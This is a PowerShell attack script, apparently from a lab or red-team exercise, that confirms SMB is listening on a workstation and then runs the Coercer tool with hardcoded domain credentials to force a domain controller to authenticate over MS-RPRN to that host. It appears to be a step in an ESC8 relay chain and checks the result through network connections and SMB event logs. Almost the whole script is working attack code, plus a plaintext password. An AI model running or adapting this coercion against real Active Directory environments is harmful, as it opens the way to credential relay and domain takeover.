# Definitive test: real SMB up on ws01, coerce dc01 MS-RPRN -> ws01, watch for inbound connection from dc01
$ErrorActionPreference = "Continue"
$env:PYTHONIOENCODING = "utf-8"
$work = "C:\Tools\cadre-attack"
Set-Location $work

Write-Output "=== confirm real SMB up ==="
Get-Service LanmanServer | Format-Table Status,Name -AutoSize
$c = Get-NetTCPConnection -LocalPort 445 -State Listen -ErrorAction SilentlyContinue
Write-Output "445_listening=$([bool]$c)"

Write-Output "=== clear SMB server event log baseline ==="
$before = (Get-Date)

Write-Output "=== coerce dc01 MS-RPRN to ws01 (real SMB) ==="
$coercerLog = Join-Path $work "esc8-coercer-real.log"
Remove-Item $coercerLog -ErrorAction SilentlyContinue
& "C:\Tools\RedStrike\.venv\Scripts\coercer.exe" coerce -u chief_command -p "C0mm@nd_Ch1ef!" -d cadre.local --dc-ip 192.168.77.10 -t 192.168.77.10 -l 192.168.77.62 --filter-protocol-name MS-RPRN --auth-type smb --always-continue 2>&1 | Out-File $coercerLog -Encoding UTF8 -Force
Write-Output "coerce_rc=$LASTEXITCODE"
Start-Sleep -Seconds 5

Write-Output "=== coercer log ==="
Get-Content $coercerLog

Write-Output "=== inbound SMB connections from dc01 (192.168.77.10) ==="
Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue |
  Where-Object { $_.RemoteAddress -eq "192.168.77.10" -and $_.LocalPort -eq 445 } |
  Format-Table LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess -AutoSize

Write-Output "=== SMB server event log (5140 etc) after trigger ==="
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-SmbServer/Operational'; StartTime=$before} -ErrorAction SilentlyContinue |
  Select-Object -First 10 | Format-Table TimeCreated,Id,Message -AutoSize -Wrap
